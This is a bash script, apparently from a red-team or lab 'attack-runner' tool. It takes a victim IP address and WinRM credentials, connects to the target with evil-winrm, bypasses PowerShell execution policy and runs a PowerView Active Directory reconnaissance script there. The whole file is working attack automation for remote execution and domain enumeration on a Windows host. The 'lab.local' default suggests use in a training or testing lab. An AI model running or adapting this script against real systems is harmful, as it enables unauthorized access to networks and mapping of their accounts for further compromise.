#!/usr/bin/env bash
set -eu

RUN_ID="${1:-run-manual}"
PARAMS_JSON="${2:-}"
if [ -z "$PARAMS_JSON" ]; then
  PARAMS_JSON='{}'
fi

PYTHON_BIN="/home/ubuntu/attack-runner/venv/bin/python3"

get_param() {
  local key="$1"
  local default_value="${2:-}"
  "$PYTHON_BIN" - "$PARAMS_JSON" "$key" "$default_value" <<'PY'
import json
import sys

raw = sys.argv[1]
key = sys.argv[2]
default_value = sys.argv[3]

try:
    data = json.loads(raw)
    value = data.get(key, default_value)
    print(value if value is not None else "")
except Exception:
    print(default_value)
PY
}

VICTIM_HOST="$(get_param target_ip)"
WINRM_USER="$(get_param winrm_user)"
WINRM_PASS="$(get_param winrm_pass)"
DOMAIN_NAME="$(get_param domain_name "lab.local")"

if [ -z "$VICTIM_HOST" ] || [ -z "$WINRM_USER" ] || [ -z "$WINRM_PASS" ]; then
  echo "[ERROR] required params missing"
  echo "  victim_host=$VICTIM_HOST"
  echo "  winrm_user=$WINRM_USER"
  echo "  domain_name=$DOMAIN_NAME"
  exit 1
fi

if ! command -v evil-winrm >/dev/null 2>&1; then
  echo "[ERROR] evil-winrm is not installed"
  exit 1
fi

TMP_CMDS="/tmp/powerview_cmd_${RUN_ID}.txt"

cat > "$TMP_CMDS" <<EOF
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
& "C:\\Tools\\PowerView\\pv_recon.ps1" -DomainUser "$WINRM_USER" -DomainPass "$WINRM_PASS" -Domain "$DOMAIN_NAME"
exit
EOF

echo "[INFO] =========================================="
echo "[INFO] PowerView AD recon started"
echo "[INFO] run_id      : $RUN_ID"
echo "[INFO] victim_host : $VICTIM_HOST"
echo "[INFO] winrm_user  : $WINRM_USER"
echo "[INFO] domain_name : $DOMAIN_NAME"
echo "[INFO] =========================================="

set +e
evil-winrm -i "$VICTIM_HOST" -u "$WINRM_USER" -p "$WINRM_PASS" < "$TMP_CMDS"
RC=$?
set -e

rm -f "$TMP_CMDS"

echo "[INFO] =========================================="
echo "[INFO] PowerView AD recon finished"
echo "[INFO] return code : $RC"
echo "[INFO] =========================================="

exit "$RC"